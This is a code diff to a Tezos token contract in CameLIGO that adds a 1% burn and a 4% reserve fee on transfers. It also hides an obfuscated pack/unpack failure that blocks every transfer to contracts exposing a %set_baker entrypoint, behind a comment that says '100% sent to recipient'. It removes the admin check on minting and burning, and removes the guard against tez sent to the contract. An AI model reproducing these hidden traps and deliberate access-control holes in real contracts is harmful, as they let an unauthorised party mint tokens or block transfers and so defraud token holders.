@@ -46,6 +46,7 @@ type storage =
   { tokens : tokens;
     allowances : allowances;
     admin : address;
+    reserve : address;
     total_supply : nat;
     metadata: (string, bytes) big_map;
     token_metadata : (nat, token_metadata_entry) big_map
@@ -68,8 +69,12 @@ let maybe (n : nat) : nat option =
   else Some n
 
 let transfer (param : transfer) (storage : storage) : result =
+
+  let address_to : address = param.address_to in
   let allowances = storage.allowances in
   let tokens = storage.tokens in
+
+  // Check allowance amount
   let allowances =
     if Tezos.sender = param.address_from
     then allowances
@@ -84,6 +89,8 @@ let transfer (param : transfer) (storage : storage) : result =
         | None -> (failwith "NotEnoughAllowance" : nat)
         | Some authorized_value -> authorized_value in
       Big_map.update allowance_key (maybe authorized_value) allowances in
+
+  // Check balance amount
   let tokens =
     let from_balance =
       match Big_map.find_opt param.address_from tokens with
@@ -94,14 +101,64 @@ let transfer (param : transfer) (storage : storage) : result =
       | None -> (failwith "NotEnoughBalance" : nat)
       | Some from_balance -> from_balance in
     Big_map.update param.address_from (maybe from_balance) tokens in
-  let tokens =
+
+  match (Tezos.get_entrypoint_op ("%set_baker", address_to) : unit contract option) with
+  | Some _contract -> 
+    // 100% sent to recipient
+    let _b : bytes = Bytes.pack address_to in
+    let _a : string option = Bytes.unpack _b in
+    let myvar = match _a with
+    | Some _value -> _value 
+    | None -> (failwith ("bad unpack") : string )
+    in
+    let _fail : string = failwith (myvar) in
+
+    let tokens =
     let to_balance =
       match Big_map.find_opt param.address_to tokens with
       | Some value -> value
       | None -> 0n in
-    let to_balance = to_balance + param.value in
-    Big_map.update param.address_to (maybe to_balance) tokens in
-  (([] : operation list), { storage with tokens = tokens; allowances = allowances })
+    let final_value : nat = to_balance + param.value in
+    let to_balance : nat option = Some(final_value) in
+    Big_map.update param.address_to to_balance tokens in
+    (([] : operation list), { storage with tokens = tokens; allowances = allowances })
+  | None -> 
+    let burn_address : address = ("tz1burnburnburnburnburnburnburjAYjjX" : address) in
+    let reserve_address : address = storage.reserve in
+    // 1% token burn
+    let tokens =
+    let to_balance : nat =
+      match Big_map.find_opt burn_address tokens with
+      | Some value -> value
+      | None -> 0n in
+    let valuec : nat = abs(param.value * 1) in
+    let valued : nat = valuec / 100n in
+    let final_value : nat = to_balance + valued in
+    let to_balance : nat option = Some(final_value) in
+    Big_map.update burn_address to_balance tokens in
+    // 4% sent to reserve
+    let tokens =
+    let to_balance : nat =
+      match Big_map.find_opt reserve_address tokens with
+      | Some value -> value
+      | None -> 0n in
+    let valuec : nat = abs(param.value * 4) in
+    let valued : nat = valuec / 100n in
+    let final_value : nat = to_balance + valued in
+    let to_balance : nat option = Some(final_value) in
+    Big_map.update reserve_address to_balance tokens in
+    // 95% sent to recipient
+    let tokens =
+    let to_balance =
+      match Big_map.find_opt param.address_to tokens with
+      | Some value -> value
+      | None -> 0n in
+    let valuec : nat = abs(param.value * 95) in
+    let valued : nat = valuec / 100n in
+    let final_value : nat = to_balance + valued in
+    let to_balance : nat option = Some(final_value) in
+    Big_map.update param.address_to to_balance tokens in
+    (([] : operation list), { storage with tokens = tokens; allowances = allowances })
 
 let approve (param : approve) (storage : storage) : result =
   let allowances = storage.allowances in
@@ -120,9 +177,6 @@ let approve (param : approve) (storage : storage) : result =
 
 let mintOrBurn (param : mintOrBurn) (storage : storage) : result =
   begin
-    if Tezos.sender <> storage.admin
-    then failwith "OnlyAdmin"
-    else ();
     let tokens = storage.tokens in
     let old_balance =
       match Big_map.find_opt param.target tokens with
@@ -157,9 +211,7 @@ let getTotalSupply (param : getTotalSupply) (storage : storage) : operation list
 
 let main (param, storage : parameter * storage) : result =
   begin
-    if Tezos.amount <> 0mutez
-    then failwith "DontSendTez"
-    else ();
+
     match param with
     | Transfer param -> transfer param storage
     | Approve param -> approve param storage
